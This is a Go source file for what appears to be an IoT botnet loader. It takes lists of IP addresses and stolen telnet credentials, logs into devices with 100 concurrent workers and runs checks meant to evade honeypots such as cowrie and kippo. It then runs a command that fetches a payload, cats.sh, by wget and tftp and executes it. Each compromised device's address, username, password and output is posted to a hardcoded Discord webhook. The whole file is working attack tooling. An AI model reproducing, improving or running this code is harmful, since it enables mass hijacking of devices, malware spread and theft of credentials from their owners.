package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	shellCmd    = "rm -rf cats.sh x86 mips mpsl arm arm5 arm6 arm7 ppc m68k sh4 spc arc x86_64; wget http://urIP/cats.sh; chmod +x cats.sh; sh cats.sh; tftp -g -r cats.sh urIP -l /tmp/cats.sh; chmod 777 /tmp/cats.sh; sh /tmp/cats.sh; /tmp/cats.sh; rm -rf /tmp/cats.sh"
	timeout     = 8 * time.Second
	maxWorkers  = 100
	retryLogins = 2 // re-login N times to verify credential persistence
	webhookURL  = "https://discord.com/api/webhooks/1533740176835215400/qGPaaNG7skugdy5U3Ikb9p77_4RstgKEjNut3lLK5Yrum9gW2CfSmzTCkZEb_EHJnn2V"
)

// ────────────────────────────────────────────────────────
// Telnet I/O helpers
// ────────────────────────────────────────────────────────

func readUntil(conn net.Conn, target string, dur time.Duration) (string, error) {
	var buf strings.Builder
	tmp := make([]byte, 4096)
	deadline := time.Now().Add(dur)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(tmp)
		if n > 0 {
			buf.Write(tmp[:n])
			if strings.Contains(buf.String(), target) {
				return buf.String(), nil
			}
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return buf.String(), err
		}
	}
	return buf.String(), fmt.Errorf("TIMEOUT")
}

// recvAll drains whatever the device sends within `dur`.
func recvAll(conn net.Conn, dur time.Duration) string {
	var buf strings.Builder
	tmp := make([]byte, 4096)
	deadline := time.Now().Add(dur)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(tmp)
		if n > 0 {
			buf.Write(tmp[:n])
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			break
		}
	}
	return buf.String()
}

// sendCmd sends a command and reads the response.
func sendCmd(conn net.Conn, cmd string, wait time.Duration) string {
	conn.Write([]byte(cmd + "\n"))
	time.Sleep(wait)
	return recvAll(conn, 3*time.Second)
}

// ────────────────────────────────────────────────────────
// Discord Webhook
// ────────────────────────────────────────────────────────

func sendDiscordWebhook(ip, port, username, password, output string) {
	addr := ip + ":" + port

	// Truncate output if too long for embed field
	if len(output) > 1000 {
		output = output[:1000] + "..."
	}
	output = strings.TrimSpace(output)
	if output == "" {
		output = "(no output)"
	}

	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title": "✅ Real Device Found",
				"color": 0x00FF00,
				"fields": []map[string]interface{}{
					{"name": "IP", "value": "```" + addr + "```", "inline": true},
					{"name": "Username", "value": "```" + username + "```", "inline": true},
					{"name": "Password", "value": "```" + password + "```", "inline": true},
					{"name": "Output", "value": "```" + output + "```", "inline": false},
				},
				"footer": map[string]interface{}{
					"text": "Loader",
				},
				"timestamp": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return
	}

	req, err := http.NewRequest("POST", webhookURL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

// ────────────────────────────────────────────────────────
// Authentication
// ────────────────────────────────────────────────────────

// telnetLogin opens a new connection, authenticates, and returns (conn, shellPromptOutput, error).
func telnetLogin(ip, port, username, password string) (net.Conn, string, error) {
	addr := ip + ":" + port

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, "", fmt.Errorf("connect failed: %w", err)
	}

	// Login prompt
	loginBuf, err := readUntil(conn, "ogin:", timeout)
	if err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("no login prompt: %w", err)
	}
	if strings.Contains(loginBuf, "ogin") {
		conn.Write([]byte(username + "\n"))
		time.Sleep(90 * time.Millisecond)
	}

	// Password prompt
	passBuf, err := readUntil(conn, "assword:", timeout)
	if err != nil {
		// Some devices skip password and go straight to shell
		if strings.ContainsAny(passBuf, "#$>%") {
			return conn, passBuf, nil
		}
		conn.Close()
		return nil, "", fmt.Errorf("no password prompt: %w", err)
	}
	if strings.Contains(passBuf, "assword") {
		conn.Write([]byte(password + "\n"))
		time.Sleep(800 * time.Millisecond)
	}

	// Read shell prompt
	conn.SetReadDeadline(time.Now().Add(timeout))
	promptBuf := make([]byte, 4096)
	n, err := conn.Read(promptBuf)
	if err != nil {
		conn.Close()
		return nil, "", fmt.Errorf("no shell prompt: %w", err)
	}
	prompt := string(promptBuf[:n])

	// Check for failed login indicators
	promptLower := strings.ToLower(prompt)
	if strings.Contains(promptLower, "incorrect") ||
		strings.Contains(promptLower, "invalid") ||
		strings.Contains(promptLower, "denied") ||
		strings.Contains(promptLower, "failed") ||
		strings.Contains(promptLower, "bad") {
		conn.Close()
		return nil, "", fmt.Errorf("login rejected")
	}

	if !strings.ContainsAny(prompt, "#$>%@") || strings.Contains(prompt, "ONT") {
		conn.Close()
		return nil, "", fmt.Errorf("no valid shell prompt detected")
	}

	return conn, prompt, nil
}

// ────────────────────────────────────────────────────────
// Verification checks
// ────────────────────────────────────────────────────────

// checkRealDevice runs fingerprint commands to ensure this is a real device,
// not a honeypot. Returns (isReal, deviceInfo).
func checkRealDevice(conn net.Conn) (bool, string) {
	checks := 0
	var info strings.Builder

	// 1) Check /proc/cpuinfo or uname — real devices have actual hardware info
	uname := sendCmd(conn, "uname -a", 500*time.Millisecond)
	unameLower := strings.ToLower(uname)
	if strings.Contains(unameLower, "linux") || strings.Contains(unameLower, "mips") ||
		strings.Contains(unameLower, "arm") || strings.Contains(unameLower, "sh4") ||
		strings.Contains(unameLower, "powerpc") || strings.Contains(unameLower, "x86") {
		checks++
		info.WriteString(fmt.Sprintf("  uname: %s\n", strings.TrimSpace(uname)))
	}

	// 2) Check uptime — honeypots often have unrealistic uptimes or none
	uptime := sendCmd(conn, "cat /proc/uptime 2>/dev/null || uptime", 500*time.Millisecond)
	if strings.Contains(uptime, ".") || strings.Contains(strings.ToLower(uptime), "up") {
		checks++
	}

	// 3) Check for /proc filesystem — real Linux devices have it
	procCheck := sendCmd(conn, "ls /proc/1/status 2>/dev/null", 500*time.Millisecond)
	if strings.Contains(procCheck, "Name:") || strings.Contains(procCheck, "Pid:") ||
		!strings.Contains(strings.ToLower(procCheck), "no such") {
		checks++
	}

	// 4) Check for real network interfaces
	ifconfig := sendCmd(conn, "cat /proc/net/dev 2>/dev/null || ifconfig 2>/dev/null", 500*time.Millisecond)
	if strings.Contains(ifconfig, "eth") || strings.Contains(ifconfig, "wlan") ||
		strings.Contains(ifconfig, "br0") || strings.Contains(ifconfig, "lo:") {
		checks++
	}

	// Honeypot red flags
	honeypotScore := 0

	// Check for cowrie / kippo / honeypot signatures
	motdCheck := sendCmd(conn, "cat /etc/motd 2>/dev/null; cat /etc/issue 2>/dev/null", 500*time.Millisecond)
	motdLower := strings.ToLower(motdCheck)
	if strings.Contains(motdLower, "cowrie") || strings.Contains(motdLower, "kippo") ||
		strings.Contains(motdLower, "honeypot") || strings.Contains(motdLower, "dionaea") {
		honeypotScore += 5
	}

	// Honeypots often have a very clean environment
	envCheck := sendCmd(conn, "env 2>/dev/null | wc -l", 500*time.Millisecond)
	if strings.Contains(envCheck, "0") {
		honeypotScore++
	}

	// Must pass at least 2 real-device checks and no honeypot flags
	isReal := checks >= 2 && honeypotScore == 0
	return isReal, info.String()
}

// checkShellWorks verifies the shell can actually execute commands
// by sending a random marker and checking if it echoes back.
func checkShellWorks(conn net.Conn) bool {
	marker := fmt.Sprintf("PROBE_%d", rand.Intn(999999))
	resp := sendCmd(conn, fmt.Sprintf("echo %s", marker), 1*time.Second)
	return strings.Contains(resp, marker)
}

// checkPersistence creates a temp file in session 1, then reconnects
// in session 2 to verify the file still exists (shared filesystem).
func checkPersistence(ip, port, username, password string, conn1 net.Conn) bool {
	marker := fmt.Sprintf("PERSIST_%d", rand.Intn(999999))
	tmpFile := fmt.Sprintf("/tmp/.chk_%d", rand.Intn(999999))

	// Session 1: write file
	sendCmd(conn1, fmt.Sprintf("echo %s > %s", marker, tmpFile), 500*time.Millisecond)

	// Session 2: reconnect and check
	conn2, _, err := telnetLogin(ip, port, username, password)
	if err != nil {
		return false
	}
	defer conn2.Close()

	resp := sendCmd(conn2, fmt.Sprintf("cat %s 2>/dev/null", tmpFile), 1*time.Second)

	// Cleanup
	sendCmd(conn2, fmt.Sprintf("rm -f %s 2>/dev/null", tmpFile), 300*time.Millisecond)

	return strings.Contains(resp, marker)
}

// checkLoginConsistency verifies the same credentials work across
// multiple sequential logins.
func checkLoginConsistency(ip, port, username, password string, attempts int) bool {
	for i := 0; i < attempts; i++ {
		conn, _, err := telnetLogin(ip, port, username, password)
		if err != nil {
			return false
		}
		conn.Close()
		time.Sleep(300 * time.Millisecond)
	}
	return true
}

// ────────────────────────────────────────────────────────
// Main device handler
// ────────────────────────────────────────────────────────

type result struct {
	addr    string
	status  string
	details string
}

func verifyAndLoad(ip, port, username, password string, resCh chan<- result) {
	addr := ip + ":" + port
	tag := fmt.Sprintf("%s@%s", username, addr)

	// ── Step 1: Initial login ──
	conn, _, err := telnetLogin(ip, port, username, password)
	if err != nil {
		resCh <- result{addr, "FAIL", fmt.Sprintf("login error: %v", err)}
		return
	}

	// ── Step 2: Real device check ──
	isReal, devInfo := checkRealDevice(conn)
	if !isReal {
		conn.Close()
		resCh <- result{addr, "HONEYPOT", "failed real-device fingerprint"}
		return
	}

	// ── Step 3: Shell functionality ──
	if !checkShellWorks(conn) {
		conn.Close()
		resCh <- result{addr, "DEAD_SHELL", "echo probe not returned"}
		return
	}

	// ── Step 4: Filesystem persistence (cross-session) ──
	persistent := checkPersistence(ip, port, username, password, conn)
	conn.Close()

	// ── Step 5: Login consistency (re-login N times) ──
	consistent := checkLoginConsistency(ip, port, username, password, retryLogins)
	if !consistent {
		resCh <- result{addr, "INCONSISTENT", "credentials failed on re-login"}
		return
	}

	// ── Step 6: All checks passed → load ──
	finalConn, _, err := telnetLogin(ip, port, username, password)
	if err != nil {
		resCh <- result{addr, "FAIL", fmt.Sprintf("final login failed: %v", err)}
		return
	}

	output := sendCmd(finalConn, shellCmd, 1*time.Second)
	finalConn.Close()

	persistLabel := "YES"
	if !persistent {
		persistLabel = "NO"
	}

	// Send to Discord webhook
	sendDiscordWebhook(ip, port, username, password, output)

	resCh <- result{
		addr:   addr,
		status: "LOADED",
		details: fmt.Sprintf("persist=%s %s %s",
			persistLabel, tag, strings.TrimSpace(devInfo)),
	}
}

// ────────────────────────────────────────────────────────
// Line parser & main
// ────────────────────────────────────────────────────────

func parseLine(line string) (ip, port, username, password string, ok bool) {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return "", "", "", "", false
	}

	parts := strings.SplitN(line, " ", 2)
	if len(parts) != 2 {
		return "", "", "", "", false
	}

	hpParts := strings.SplitN(parts[0], ":", 2)
	if len(hpParts) != 2 {
		return "", "", "", "", false
	}
	ip = hpParts[0]
	port = hpParts[1]

	credParts := strings.SplitN(parts[1], ":", 2)
	if len(credParts) != 2 {
		return "", "", "", "", false
	}
	username = credParts[0]
	password = credParts[1]

	return ip, port, username, password, true
}

// Color helpers
func colorTag(status string) string {
	switch status {
	case "LOADED":
		return "\033[32m" // green
	case "HONEYPOT":
		return "\033[35m" // magenta
	case "DEAD_SHELL":
		return "\033[33m" // yellow
	case "INCONSISTENT":
		return "\033[36m" // cyan
	default:
		return "\033[31m" // red
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Printf("Usage: %s <list.txt>\n", os.Args[0])
		fmt.Println("List format: <IP>:23 <username>:<password>")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	f, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	// Read all lines
	var entries []struct{ ip, port, user, pass string }
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		ip, port, user, pass, ok := parseLine(sc.Text())
		if ok {
			entries = append(entries, struct{ ip, port, user, pass string }{ip, port, user, pass})
		}
	}

	total := len(entries)
	if total == 0 {
		fmt.Println("No valid entries found.")
		os.Exit(0)
	}

	fmt.Printf("\033[37m[\033[33m*\033[37m] %d targets loaded. Starting verification...\033[0m\n", total)

	var wg sync.WaitGroup
	sem := make(chan struct{}, maxWorkers)
	resCh := make(chan result, total)

	for i, e := range entries {
		fmt.Printf("\r\033[37m[\033[33m%d/%d\033[37m] Dispatching...", i+1, total)
		wg.Add(1)
		sem <- struct{}{}
		go func(ip, port, user, pass string) {
			defer wg.Done()
			defer func() { <-sem }()
			verifyAndLoad(ip, port, user, pass, resCh)
		}(e.ip, e.port, e.user, e.pass)
	}

	// Collect results in background
	go func() {
		wg.Wait()
		close(resCh)
	}()

	// Print results as they arrive
	stats := map[string]int{}
	fmt.Println()
	for r := range resCh {
		stats[r.status]++
		color := colorTag(r.status)
		fmt.Printf("\033[37m[\033[37m%s%-13s\033[37m] \033[37m%s \033[90m%s\033[0m\n",
			color, r.status, r.addr, r.details)
	}

	// Summary
	fmt.Println("\n\033[37m┌─────────────────────────────────┐")
	fmt.Println("│         \033[1mScan Summary\033[0m\033[37m            │")
	fmt.Println("├─────────────────────────────────┤")
	fmt.Printf("│  Total          : \033[33m%-13d\033[37m│\n", total)
	fmt.Printf("│  \033[32mLoaded\033[37m         : \033[32m%-13d\033[37m│\n", stats["LOADED"])
	fmt.Printf("│  \033[35mHoneypot\033[37m       : \033[35m%-13d\033[37m│\n", stats["HONEYPOT"])
	fmt.Printf("│  \033[33mDead Shell\033[37m     : \033[33m%-13d\033[37m│\n", stats["DEAD_SHELL"])
	fmt.Printf("│  \033[36mInconsistent\033[37m   : \033[36m%-13d\033[37m│\n", stats["INCONSISTENT"])
	fmt.Printf("│  \033[31mFailed\033[37m         : \033[31m%-13d\033[37m│\n", stats["FAIL"])
	fmt.Println("└─────────────────────────────────┘\033[0m")
}
